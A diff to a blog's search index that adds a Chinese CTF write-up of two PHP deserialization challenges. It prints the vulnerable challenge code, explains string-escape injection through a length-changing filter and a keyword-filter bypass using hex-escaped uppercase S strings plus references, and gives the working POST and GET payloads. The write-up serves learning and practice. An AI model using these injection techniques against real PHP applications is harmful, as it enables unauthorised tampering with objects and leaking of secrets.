@@ -1,6 +1,61 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>NUCTF</title>
+    <url>/2021/06/24/NUCTF/</url>
+    <content><![CDATA[<p>概述：主要考点 — 序列化与反序列化字符逃逸</p>
+<span id="more"></span>
+
+<h1 id="NUCTF"><a href="#NUCTF" class="headerlink" title="NUCTF"></a>NUCTF</h1><h2 id="1-EasyUnser"><a href="#1-EasyUnser" class="headerlink" title="1 EasyUnser"></a>1 EasyUnser</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);<span class="comment">// Security filtering function	</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> str_replace(<span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;secured&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">       <span class="comment">// Security filtering</span></span><br><span class="line">       <span class="variable">$h</span>-&gt;username = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">       <span class="variable">$c</span> = unserialize(filter(serialize(<span class="variable">$h</span>)));</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$c</span>-&gt;password === <span class="string">&#x27;hacker&#x27;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析：</strong></p>
+<blockquote>
+<ol>
+<li>POST 传入参数 username 和 password</li>
+<li>题目初始化 <code>public $password = &#39;margin123&#39;;</code> ，而要想获取 flag 必须使 password 为 hacker</li>
+<li>根据 PHP 反序列化时遇到 <code>;&#125;</code> 即反序列化结束，我们传入 username 为 <code>margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code> ，希望原本初始化的 password 的值 <code>margin123</code> 失效</li>
+</ol>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:37:&quot;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   print_r(unserialize(<span class="variable">$h</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ol start="4">
+<li>如果我们将上面的得到的内容进行 <code>反序列化输出</code>，结果将会报错；这是因为 <code>s:37:&quot;margin&quot;;</code> 这里按道理应该是 <code>s:6:&quot;margin&quot;;</code>，但由于我们需要按照上面的方法将后面的 <code>&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</code> 挤掉，因此实际上传入的长度是37，所以我们需要想办法将这37个长度补齐，还需要多传入 31个长度；</li>
+<li>题目中的 filter 函数即是将 <code>secuer 替换为 secured</code> ，一个 secured 比 secure 多一个长度，那么 31个 secure 就会多出 31个长度，从而导致字符增加</li>
+</ol>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line">实际上username的长度是<span class="number">186</span>，但是被替换之后成为</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 被 filter 替换之后变成 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securedsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecured&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样就补齐了</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>payload：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post传参：   username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure%<span class="number">22</span>;s:<span class="number">8</span>:%<span class="number">22</span>password%<span class="number">22</span>;s:<span class="number">6</span>:%<span class="number">22</span>hacker%<span class="number">22</span>;&#125;&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-Just-Serizlize"><a href="#2-Just-Serizlize" class="headerlink" title="2 Just Serizlize"></a>2 Just Serizlize</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;<span class="comment">// $flag = &quot;DASCTF&#123;xxxxx&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;obj&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$obj</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = @unserialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span>-&gt;flag === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$k</span> !== <span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$v</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析：</strong></p>
+<blockquote>
+<ol>
+<li>GET 传参 obj；</li>
+<li>传入参数不得含有 flag；对象中包含 flag 字段时，才会传入 $flag 的内容；但当字段名不为 flag 时，才能显示出 $flag；</li>
+<li>hex 编码绕过 <code>if ($k !== &quot;flag&quot;) </code> ，把 s 换成 S；</li>
+<li>表示字符类型的s大写时, 会被当成16进制解析, 定义一个变量取 flag 变量的地址即可得到 flag 变量的值；</li>
+</ol>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$obj</span> = (<span class="keyword">object</span>)[<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">  <span class="variable">$obj</span>-&gt;Hh0 = &amp;<span class="variable">$obj</span>-&gt;flag;</span><br><span class="line">  <span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;s:3:&quot;Hh0&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>payload：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;Hh0&quot;</span>;R:<span class="number">2</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;asd&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Web基础</title>
     <url>/2021/05/24/Web%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p>攻击者攻击服务器–首先要保证两者之间能正常的进行通信<br>如何通信？服务器上的各种服务都是依托于 端口 来实现对外提供服务的，攻击者所入侵的就是端口<br>什么是Web应用？提供W e b服务的应用系统,其实通俗讲就是一个网站。</p>
@@ -557,8 +612,8 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>CTF</tag>
+        <tag>Web</tag>
         <tag>BUUCTF</tag>
       </tags>
   </entry>
@@ -793,8 +848,8 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>CTF</tag>
+        <tag>Web</tag>
         <tag>BUUCTF</tag>
       </tags>
   </entry>
@@ -1100,8 +1155,8 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>CTF</tag>
+        <tag>Web</tag>
         <tag>BUUCTF</tag>
       </tags>
   </entry>
